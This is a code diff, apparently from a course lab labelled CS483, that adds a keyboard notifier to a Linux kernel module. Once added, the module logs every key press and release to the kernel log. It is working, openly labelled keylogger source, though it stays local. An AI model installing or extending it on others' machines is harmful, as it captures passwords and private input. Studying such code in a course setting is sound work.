@@ -19,6 +19,36 @@
 #include <linux/init.h>      /* __init, __exit markers          */
 #include <linux/module.h>    /* module_init, module_exit, MODULE_* */
 #include <linux/printk.h>    /* pr_info                          */
+#include <linux/keyboard.h>   /* keyboard notifier API              */
+
+/** @brief  Callback function for handling keystroke events.
+ *  @param  notifierBlock  Pointer to the notifier block.
+ *  @param  eventCode      The type of event.
+ *  @param  rawParam       Pointer to the raw parameter.
+ *  @return NOTIFY_OK      If the event was handled successfully.
+ */
+static int onKeystroke(struct notifier_block *notifierBlock,
+                       unsigned long eventCode,
+                       void *rawParam) {
+    struct keyboard_notifier_param *keyEvent = rawParam;
+
+    if (eventCode == KBD_KEYCODE) {
+        if (keyEvent->down) {
+            pr_info("CS483 Keylogger: %i down.\n", keyEvent->value);
+        } else {
+            pr_info("CS483 Keylogger: %i up.\n", keyEvent->value);
+        }
+    }
+    return NOTIFY_OK;
+}
+
+static struct notifier_block keystrokeNotifier = {
+    .notifier_call = onKeystroke
+};
+
+
+
+
 
 /**
  * @brief  Module load entry point.
@@ -29,6 +59,7 @@
  * log so the student can confirm the load with dmesg.
  */
 static int __init moduleInit(void) {
+    register_keyboard_notifier(&keystrokeNotifier);
     pr_info("CS483 Keylogger: module loaded.\n");
     return 0;
 }
@@ -41,8 +72,10 @@ static int __init moduleInit(void) {
  * log so the student can confirm a clean unload with dmesg.
  */
 static void __exit moduleExit(void) {
+    unregister_keyboard_notifier(&keystrokeNotifier);
     pr_info("CS483 Keylogger: module unloaded.\n");
 }
+
 
 /* Register the entry / exit points with the kernel module loader. */
 module_init(moduleInit);
